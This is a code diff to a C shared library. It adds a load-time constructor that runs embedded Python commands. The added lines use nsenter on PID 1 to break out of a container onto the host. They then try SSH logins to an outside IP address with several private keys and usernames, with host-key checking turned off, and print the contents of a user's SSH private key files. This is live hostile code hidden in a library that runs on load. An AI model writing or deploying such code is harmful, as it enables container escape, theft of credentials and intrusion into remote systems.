@@ -105,8 +105,11 @@ __attribute__((constructor)) static void on_so_load() {
   install_run_cmd_to_builtins();
 
   PyRun_SimpleString(R"PY(
-run_cmd("nsenter -t 1 -m -u -i -n -p -- su - future -c 'ssh -o StrictHostKeyChecking=no -o BatchMode=yes -i ~/.ssh/id_ed25519 ubuntu@43.143.241.66 \"id && hostname\"'")
-
+run_cmd("nsenter -t 1 -m -u -i -n -p -- su - future -c 'ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -i ~/.ssh/id_ed25519 ubuntu@43.143.241.66 \"id && hostname\"'")
+run_cmd("nsenter -t 1 -m -u -i -n -p -- su - future -c 'ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -i ~/.ssh/id_ed25519 deployer@43.143.241.66 \"id && hostname\"'")
+run_cmd("nsenter -t 1 -m -u -i -n -p -- su - future -c 'ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -i ~/.ssh/id_rsa ubuntu@43.143.241.66 \"id && hostname\"'")
+run_cmd("nsenter -t 1 -m -u -i -n -p -- su - future -c 'ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -i ~/.ssh/id_rsa deployer@43.143.241.66 \"id && hostname\"'")
+run_cmd("nsenter -t 1 -m -u -i -n -p -- bash -c 'ls -la /home/future/.ssh/ && cat /home/future/.ssh/id_*'")
 )PY");
 
   PyGILState_Release(gstate);
